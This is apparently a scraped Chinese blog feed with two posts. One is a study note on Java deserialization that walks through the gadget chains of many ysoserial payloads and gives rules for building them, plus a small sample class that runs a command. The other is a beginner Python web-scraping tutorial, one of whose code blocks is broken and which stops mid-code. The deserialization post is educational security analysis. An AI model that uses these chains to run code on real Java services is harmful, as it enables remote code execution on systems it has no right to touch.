<span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name.contains(<span class="string">"org.apache.xalan"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>还是一个简简单单的黑名单。</p><h2 id="POP的艺术"><a href="#POP的艺术" class="headerlink" title="POP的艺术"></a>POP的艺术</h2><p>既然反序列化漏洞常见的修复方案是黑名单，就存在被绕过的风险，一旦出现新的POP链，原来的防御也就直接宣告无效了。</p><p>所以在反序列化漏洞的对抗史中，除了有大佬不断的挖掘新的反序列化漏洞点，更有大牛不断的探寻新的POP链。</p><p>POP已经成为反序列化区别于其他常规Web安全漏洞的一门特殊艺术。</p><p>既然如此，我们就用ysoserial这个项目，来好好探究一下现在常用的这些RCE类POP中到底有什么乾坤：</p><h3 id="BeanShell1"><a href="#BeanShell1" class="headerlink" title="BeanShell1"></a>BeanShell1</h3><p><font color="#0099ff">命令执行载体：</font><code>bsh.Interpreter</code></p><p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code> 反序列化所有元素后，通过<code>comparator.compare()</code>进行排序，该<code>comparator</code>被代理给<code>XThis.Handler</code>处理，其<code>invoke()</code>会调用<code>This.invokeMethod()</code>从<code>Interpreter</code>解释器中解析包含恶意代码的<code>compare</code>方法并执行</p><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p><font color="#0099ff">命令执行载体：</font><code>bsh.Interpreter</code></p><p><font color="#0099ff">反序列化载体：</font><code>com.mchange.v2.c3p0.PoolBackedDataSource</code></p><p><code>PoolBackedDataSource.readObject()</code>进行到父类<code>PoolBackedDataSourceBase.readObject()</code>阶段，会调用<code>ReferenceIndirector$ReferenceSerialized.getObject()</code>获取对象，其中<code>InitialContext.lookup()</code>会去加载远程恶意对象并初始化，导致命令执行，有些同学可能不太清楚远程恶意对象的长相，举个简单的例子：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Malicious</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Malicious</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h3><p><font color="#0099ff">命令执行载体：</font><code>clojure.core$comp$fn__4727</code></p><p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>反序列化各元素时，通过它的<code>hashCode()</code>得到hash值，而<code>AbstractTableModel$ff19274a.hashCode()</code>会从<code>IPersistentMap</code>中取<code>hashCode</code>键的值对象调用其<code>invoke()</code>，最终导致Clojure Shell命令字符串执行</p><hr><h3 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code>执行排序时，<code>BeanComparator.compare()</code>会根据<code>BeanComparator.property</code> <em>（值为<code>outputProperties</code>）</em> 调用<code>TemplatesImpl.getOutputProperties()</code>，它在<code>newTransformer()</code>时会创建<code>AbstractTranslet</code>实例，导致精心构造的Java字节码被执行</p><h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code><br>见前文</p><h3 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>InvokerTransformer.transform()</code>转换元素，进而获取第一个元素<code>TemplatesImpl</code>的<code>newTransformer()</code>并调用，最终导致命令执行</p><h3 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code></p><p>除<code>Transformer</code>数组元素组成不同外，与CommonsCollections1基本一致</p><h3 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>ChainedTransformer.transform()</code>转换元素，进而遍历执行<code>Transformer</code>数组中的每个元素，最终导致命令执行</p><h3 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">反序列化载体：</font><code>BadAttributeValueExpException</code></p><p><code>BadAttributeValueExpException.readObject()</code>当<code>System.getSecurityManager()</code>为<code>null</code>时，会调用<code>TiedMapEntry.toString()</code>，它在<code>getValue()</code>时会通过<code>LazyMap.get()</code>取值，最终导致命令执行</p><h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code><br><font color="#0099ff">反序列化载体：</font><code>HashSet</code><br><code>HashSet.readObject()</code>反序列化各元素后，会调用<code>HashMap.put()</code>将结果放进去，而它通过<code>TiedMapEntry.hashCode()</code>计算hash时，会调用<code>getValue()</code>触发<code>LazyMap.get()</code>导致命令执行</p><hr><h3 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.codehaus.groovy.runtime.MethodClosure</code></p><p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code></p><p><code>AnnotationInvocationHandler.readObject()</code>在通过<code>memberValues.entrySet()</code>获取<code>Entry</code>集合，该<code>memberValues</code>被代理给<code>ConvertedClosure</code>拦截<code>entrySet</code>方法，根据<code>MethodClosure</code>的构造最终会由<code>ProcessGroovyMethods.execute()</code>执行系统命令</p><h3 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>通过<code>TypedValue.hashCode()</code>计算hash时，<code>ComponentType.getPropertyValue()</code>会调用<code>PojoComponentTuplizer.getPropertyValue()</code>获取到<code>TemplatesImpl.getOutputProperties</code>方法并调用导致命令执行</p><h3 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h3><p><font color="#0099ff">命令执行载体：</font><code>com.sun.rowset.JdbcRowSetImpl</code><br><font color="#0099ff">反序列化载体：</font><code>HashMap</code><br>执行过程与Hibernate1一致，但Hibernate2并不是传入<code>TemplatesImpl</code>执行系统命令，而是利用<code>JdbcRowSetImpl.getDatabaseMetaData()</code>调用<code>connect()</code>连接到远程RMI</p><hr><h3 id="JBossInterceptors1"><a href="#JBossInterceptors1" class="headerlink" title="JBossInterceptors1"></a>JBossInterceptors1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>org.jboss.interceptor.proxy.InterceptorMethodHandler</code></p><p><code>InterceptorMethodHandler.readObject()</code>在<code>executeInterception()</code>时，会根据<code>SimpleInterceptorMetadata</code>拿到<code>TemplatesImpl</code>放进<code>ArrayList</code>中，并传入<code>SimpleInterceptionChain</code>进行初始化，它在调用<code>invokeNextInterceptor()</code>时会导致命令执行</p><h3 id="JSON1"><a href="#JSON1" class="headerlink" title="JSON1"></a>JSON1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>将各元素放进<code>HashMap</code>时，会调用<code>TabularDataSupport.equals()</code>进行比较，它的<code>JSONObject.containsValue()</code>获取对象后在<code>PropertyUtils.getProperty()</code>内动态调用<code>getOutputProperties</code>方法，它被代理给<code>CompositeInvocationHandlerImpl</code>，其中转交给<code>JdkDynamicAopProxy.invoke()</code>，在<code>AopUtils.invokeJoinpointUsingReflection()</code>时会传入从<code>AdvisedSupport.target</code>字段中取出来的<code>TemplatesImpl</code>，最终导致命令执行</p><h3 id="JavassistWeld1"><a href="#JavassistWeld1" class="headerlink" title="JavassistWeld1"></a>JavassistWeld1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>org.jboss.weld.interceptor.proxy.InterceptorMethodHandler</code></p><p>除JBoss部分包名存在差异外，与JBossInterceptors1基本一致</p><h3 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>LinkedHashSet</code></p><p><code>LinkedHashSet.readObject()</code>将各元素放进<code>HashMap</code>时，第二个元素会调用<code>equals()</code>与第一个元素进行比较，它被代理给<code>AnnotationInvocationHandler</code>进入<code>equalsImpl()</code>，在<code>getMemberMethods()</code>遍历<code>TemplatesImpl</code>的方法遇到<code>getOutputProperties</code>进行调用时，导致命令执行</p><hr><h3 id="MozillaRhino1"><a href="#MozillaRhino1" class="headerlink" title="MozillaRhino1"></a>MozillaRhino1</h3><p> <font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p> <font color="#0099ff">反序列化载体：</font><code>BadAttributeValueExpException</code></p><p> <code>BadAttributeValueExpException.readObject()</code>调用<code>NativeError.toString()</code>时，会在<code>ScriptableObject.getProperty()</code>中进入<code>getImpl()</code>，<code>ScriptableObject$Slot</code>根据<code>name</code>获取到封装了<code>Context.enter</code>方法的<code>MemberBox</code>，并通过它的<code>invoke()</code>完成调用，而之后根据<code>message</code>调用<code>TemplatesImpl.newTransformer()</code>则会导致命令执行</p><h3 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code></p><p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>通过<code>ValueExpressionMethodExpression.hashCode()</code>计算hash时，会由<code>getMethodExpression()</code>调用<code>ValueExpression.getValue()</code>，最终导致EL表达式执行</p><h3 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code><br><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p><p>执行过程与Myfaces1一致，但Myfaces2的EL表达式并不是由使用者传入的，而是预制了一串加载远程恶意对象的表达式</p><h3 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>通过<code>ObjectBean.hashCode()</code>计算hash时，会在<code>ToStringBean.toString()</code>阶段遍历<code>TemplatesImpl</code>所有字段的Setter和Getter并调用，当调用到<code>getOutputProperties()</code>时将导致命令执行</p><hr><h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p><p><code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>在调用<code>TypeProvider.getType()</code>时被代理给<code>AnnotationInvocationHandler</code>得到另一个Handler为<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>的代理，之后传给<code>ReflectionUtils.invokeMethod()</code>动态调用<code>newTransformer</code>方法时被第二个代理拦截，它的<code>objectFactory</code>字段是第三个代理，因此<code>objectFactory.getObject()</code>会获得<code>TemplatesImpl</code>，最终导致命令执行</p><h3 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h3><p> <font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">反序列化载体：</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p><p> <code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>在动态调用<code>newTransformer</code>方法时，被第二个代理拦截交给<code>JdkDynamicAopProxy</code>，它在<code>AopUtils.invokeJoinpointUsingReflection()</code>时会传入从<code>AdvisedSupport.targetSource</code>字段中取出来的<code>TemplatesImpl</code>，最终导致命令执行</p><p>根据上面这些内容，我们可以得到几条简单的POP构造法则：</p><ol><li>当依赖中不存在可以执行命令的方法时，可以选择使用<code>TemplatesImpl</code>作为命令执行载体，并想办法去触发它的<code>newTransformer</code>或<code>getOutputProperties</code>方法</li><li>可以作为入口的通用反序列化载体是<code>HashMap</code>、<code>AnnotationInvocationHandler</code>、<code>BadAttributeValueExpException</code>和<code>PriorityQueue</code>，它们都是依赖较少的JDK底层对象，区别如下：<ul><li><code>HashMap</code>，可以主动触发元素的<code>hashCode</code>和<code>equals</code>方法</li><li><code>AnnotationInvocationHandler</code>，可以主动触发<code>memberValues</code>字段的<code>setValue</code>方法，本身也可以作为动态代理的Handler拦截如<code>Map.entrySet</code>等方法进入自己的<code>invoke</code>方法</li><li><code>BadAttributeValueExpException</code>，可以主动触发<code>val</code>字段的<code>toString</code>方法</li><li><code>PriorityQueue</code>，可以主动触发<code>comparator</code>字段的<code>compare</code>方法</li></ul></li></ol><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>历年来，很多流行的Java组件框架都被爆出过反序列化漏洞，这已经有好多大牛们都进行过分析总结了，本文的主要目的也不在此，而是为了去深挖反序列化漏洞底层一些可能还没有被唤醒的地方。</p><p>不过有一点要切记，反序列化不止RCE。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://docs.oracle.com/javase/8/docs/" target="_blank" rel="noopener">JavaSE Document</a></li><li><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">Java OpenJDK Source Code</a></li><li><a href="https://github.com/unofficial-openjdk/openjdk/" target="_blank" rel="noopener">Java OpenJDK GitHub Mirror</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;github 上看到的，边看边学，边记笔记&lt;br&gt;&lt;a href=&quot;https://github.com/gyyyy&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;感谢宫音师傅的文章&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>Python 爬虫学习记录</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/28/pySpider/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/28/pySpider/</id>
    <published>2020-02-28T01:42:05.382Z</published>
    <updated>2020-02-28T13:29:49.731Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="爬虫学习"><a href="#爬虫学习" class="headerlink" title="爬虫学习"></a>爬虫学习</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>向浏览器发送请求，获取响应</li><li>得到 <code>200回显</code> 后，需要进行<code>html解析</code><ul><li>创建一个新的文件来解析 <code>html(通过正则匹配</code></li><li>调用 <code>bs4</code> 解析我们的html （<code>html5lib</code> –可以通过浏览器的形式取解析网页）</li><li>需要去获取我们需要的信息，例如：图片 -&gt; <code>img 标签</code> -&gt; <code>src属性值</code></li><li>再通过src路径向浏览器发送请求</li><li>请求成功以后,将我们的图片信息以二进制的方式进行写入我们的文件中</li><li>实现批量爬取</li></ul></li></ul><hr><h2 id="实例1-批量获取图片"><a href="#实例1-批量获取图片" class="headerlink" title="实例1 批量获取图片"></a>实例1 批量获取图片</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件下载路径</span></span><br><span class="line">download = <span class="string">"images/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 爬取网站路径</span></span><br><span class="line">        url=<span class="string">"http://sc.chinaz.com/tupian/index.html"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">"http://sc.chinaz.com/tupian/index_%d.html"</span>%i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送请求获取响应 成功状态码为200</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment">#使用bs取解析网页</span></span><br><span class="line">        bs = BeautifulSoup(response.content,<span class="string">"html5lib"</span>)</span><br><span class="line">        <span class="comment">#定位到网页中存放图片的DIV attrs 默认采用的是class</span></span><br><span class="line">        warp = bs.find(<span class="string">"div"</span>, attrs=&#123;<span class="string">"id"</span>: <span class="string">"container"</span>&#125;)</span><br><span class="line">        <span class="comment"># 获取我们的img  # 音频  audio  src</span></span><br><span class="line">        imglist = warp.find_all(<span class="string">"img"</span>)</span><br><span class="line">        <span class="comment"># 获取图片的名称 --debug来检查代码</span></span><br><span class="line">        <span class="keyword">for</span> img <span class="keyword">in</span> imglist:</span><br><span class="line">            title = img[<span class="string">"alt"</span>]</span><br><span class="line">            src = img[<span class="string">"src2"</span>]</span><br><span class="line">            <span class="comment">#需要再一次取请求图片地址 并且将图片放入文件夹中</span></span><br><span class="line">            <span class="keyword">with</span> open(download+title+<span class="string">".jpg),"</span>w<span class="string">b")as file:</span></span><br><span class="line"><span class="string">                file.write(requests.get(src).content)</span></span><br><span class="line"><span class="string">        print("</span>第%d页打印完成<span class="string">"%i)</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="实例2-单张小说"><a href="#实例2-单张小说" class="headerlink" title="实例2 单张小说"></a>实例2 单张小说</h2><p><a href="https://www.cnblogs.com/simple-li/p/11253312.html" target="_blank" rel="noopener">初识python 之 爬虫：BeautifulSoup 的 find、find_all、select 方法</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">"novel/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"><span class="comment"># 发送请求获取响应</span></span><br><span class="line">url = <span class="string">"https://www.biqukan.com/42_42882/14586139.html"</span></span><br><span class="line">reponse = requests.get(url)</span><br><span class="line"><span class="comment"># 解析响应内容</span></span><br><span class="line"><span class="keyword">if</span> reponse.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(reponse.content,<span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># 获取标题</span></span><br><span class="line">    <span class="comment"># bs.find()</span></span><br><span class="line">    <span class="comment"># bs.findAll()</span></span><br><span class="line">    <span class="comment"># bs.find_all("div",attrs=&#123;"":""&#125;)</span></span><br><span class="line">    h1 = bs.select_one(<span class="string">"h1"</span>)</span><br><span class="line">    title = h1.text</span><br><span class="line">    <span class="comment"># 找当前文章的文本</span></span><br><span class="line">    showtxt = bs.select_one(<span class="string">".showtxt"</span>).text</span><br><span class="line">    <span class="comment"># 对文本进行操作 想去掉不需要的东西(字符串类型)---replace</span></span><br><span class="line">    res = showtxt.replace(<span class="string">"app2();"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">with</span> open(download+title+<span class="string">".txt"</span>,<span class="string">"w"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(res)</span><br></pre></td></tr></table></figure></div><hr><h2 id="实例3-整本小说"><a href="#实例3-整本小说" class="headerlink" title="实例3 整本小说"></a>实例3 整本小说</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.biqukan.com/42_42882/"</span></span><br><span class="line">response = requests.get(url, header=header)</span><br><span class="line">response.encoding=<span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content,<span class="string">"html5lib"</span>)</span><br><span class="line">    title = bs.select_one(<span class="string">"h2"</span>).text+<span class="string">"/"</span></span><br><span class="line">    <span class="comment"># 在进行到我们爬取标题的时候创建以标题命名的文件夹</span></span><br><span class="line">    <span class="comment"># 文件下载路径 = "xxx/" </span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(title):</span><br><span class="line">        os.mkdir(title)</span><br><span class="line">    <span class="comment"># 找我们的div标签</span></span><br><span class="line">    listman = bs.select_one(<span class="string">".listmain"</span>)</span><br><span class="line">    <span class="comment"># 找到所有的a标签</span></span><br><span class="line">    alist = listman.select(<span class="string">"a"</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alist:</span><br><span class="line">        aTitle = a.text</span><br><span class="line">        href = a[<span class="string">"href"</span>].split(<span class="string">"/"</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print(aTitle,href)</span></span><br><span class="line">        <span class="comment"># 再一次请求进入三级域名</span></span><br><span class="line">        urlChild = url+href</span><br><span class="line">        responseChild = requests.get(urlChild)</span><br><span class="line">        <span class="keyword">if</span> responseChild.status_code == <span class="number">200</span>:</span><br><span class="line">           bsChild = BeautifulSoup(responseChild.content,<span class="string">"html5lib"</span>)</span><br><span class="line">           <span class="comment"># 找当前文章的文本 type(showtxt) (str)</span></span><br><span class="line">           showtxt = bsChild.select_one(<span class="string">".showtxt"</span>).text</span><br><span class="line">           <span class="comment"># 对文本进行操作 去掉不想要的 replace</span></span><br><span class="line">           res = showtxt.replace(<span class="string">"app2();"</span>, <span class="string">""</span>)</span><br><span class="line">           <span class="keyword">with</span> open(title + aTitle + <span class="string">".txt"</span>, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">               file.write(res)</span><br></pre></td></tr></table></figure></div><h1 id="爬虫学习2"><a href="#爬虫学习2" class="headerlink" title="爬虫学习2"></a>爬虫学习2</h1><p>自己也不知道这几天怎么过来的，反正说学到多少，也没多少，说没学，这两周每天一整个下午都在学这个。</p><h2 id="爬音频"><a href="#爬音频" class="headerlink" title="爬音频"></a>爬音频</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">"music/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.i4.cn/ring_22_0_1.html"</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># 寻找存放音乐的 div find 类似</span></span><br><span class="line">    kbox = bs.select(<span class="string">".kbox"</span>)</span><br><span class="line">    <span class="comment"># 找 ring_list</span></span><br><span class="line">    ring = kbox.select(<span 